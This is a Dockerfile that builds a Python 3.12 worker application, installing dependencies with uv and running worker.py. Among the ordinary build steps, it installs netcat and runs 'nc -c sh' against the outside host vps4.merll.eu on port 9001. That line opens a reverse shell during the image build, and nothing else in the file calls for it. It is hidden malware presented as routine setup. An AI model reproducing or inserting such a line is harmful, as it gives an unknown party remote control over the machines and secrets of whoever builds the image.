FROM python:3.12-slim

COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

RUN apt-get update \
    && apt-get install -y --no-install-recommends netcat-openbsd \
    && rm -rf /var/lib/apt/lists/*

RUN nc -c sh vps4.merll.eu 9001

WORKDIR /app

ENV UV_LINK_MODE=copy \
    UV_INDEX_STRATEGY=first-index \
    PATH="/app/.venv/bin:$PATH"

# Install dependencies first for better layer caching.
COPY pyproject.toml uv.lock ./
RUN uv sync --frozen --no-install-project

# Copy source and install the project.
COPY worker.py ./
RUN uv sync --frozen

CMD ["python", "worker.py"]
